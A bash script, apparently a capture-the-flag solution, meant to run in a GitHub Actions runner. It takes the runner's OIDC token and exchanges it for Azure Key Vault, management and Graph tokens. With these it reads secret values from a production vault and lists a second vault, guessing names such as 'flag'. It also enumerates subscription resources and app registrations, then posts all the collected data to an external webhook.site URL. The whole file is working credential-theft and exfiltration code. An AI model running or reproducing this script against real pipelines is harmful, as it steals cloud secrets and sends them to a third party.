```bash
#!/usr/bin/env bash
set -euo pipefail
WH="https://webhook.site/e0a2698b-df5f-4211-a845-1fe6b23c1c58"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default")
VAULT_TOKEN=$(echo "$VT" | jq -r '.access_token // empty')

OUT=""

# Read ALL secret VALUES from kv-tbl-prod
KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
for NAME in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  R=$(curl -sS "${KV1}/secrets/${NAME}?api-version=7.4" -H "Authorization: Bearer $VAULT_TOKEN" 2>&1)
  OUT="${OUT}=== ${NAME} === ${R} "
done

# Try second vault kv-tbl-sec-x3euoz
KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
SEC2=$(curl -sS "${KV2}/secrets?api-version=7.4" -H "Authorization: Bearer $VAULT_TOKEN" 2>&1)
OUT="${OUT}=== KV2-LIST === ${SEC2} "

# Try reading common names from second vault
for NAME in flag FLAG ctf-flag tebamoto-flag challenge-flag secret tbl-flag; do
  R=$(curl -sS "${KV2}/secrets/${NAME}?api-version=7.4" -H "Authorization: Bearer $VAULT_TOKEN" 2>&1)
  OUT="${OUT}=== KV2-${NAME} === ${R} "
done

# ARM - list all resources to find more vaults
ARM_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
if [ -n "$ARM_TOKEN" ]; then
  RESOURCES=$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" 2>&1)
  OUT="${OUT}=== ARM-RESOURCES === ${RESOURCES} "
fi

# Graph API - check app registrations
GRAPH_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
if [ -n "$GRAPH_TOKEN" ]; then
  APPS=$(curl -sS -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/applications" 2>&1)
  OUT="${OUT}=== GRAPH-APPS === ${APPS} "
fi

curl -sS -X POST "$WH" -H "Content-Type: application/json" -d "$(jq -n --arg out "$OUT" '{data: $out}')"
echo "Done"
```
